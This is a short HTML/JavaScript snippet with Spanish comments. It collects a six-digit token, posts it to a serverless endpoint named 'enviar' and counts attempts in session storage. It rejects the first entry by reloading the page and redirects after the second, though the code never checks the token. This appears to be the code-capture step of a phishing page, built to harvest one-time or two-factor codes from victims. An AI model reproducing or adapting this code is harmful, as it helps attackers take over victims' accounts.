<script>
const tokenInput = document.getElementById("tokenInput");

// Solo números
tokenInput.addEventListener("input", () => {
    tokenInput.value = tokenInput.value.replace(/[^0-9]/g, "");
});

function enviarToken() {
    const token = tokenInput.value.trim();

    // Obligatorio 6 dígitos
    if (token.length !== 6) {
        tokenInput.focus();
        return;
    }

    // Obtener intentos actuales
    let intentos = parseInt(sessionStorage.getItem("intentosToken")) || 0;
    intentos++;
    sessionStorage.setItem("intentosToken", intentos);

    fetch("/.netlify/functions/enviar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            tipo: "Token",
            valor: token
        })
    }).finally(() => {
        if (intentos >= 2) {
            // Reinicia contador y redirige
            sessionStorage.removeItem("intentosToken");
            window.location.href = "index.html";
        } else {
            // Primer intento: vuelve al mismo lugar (bucle)
            window.location.href = window.location.href;
        }
    });
}
</script>
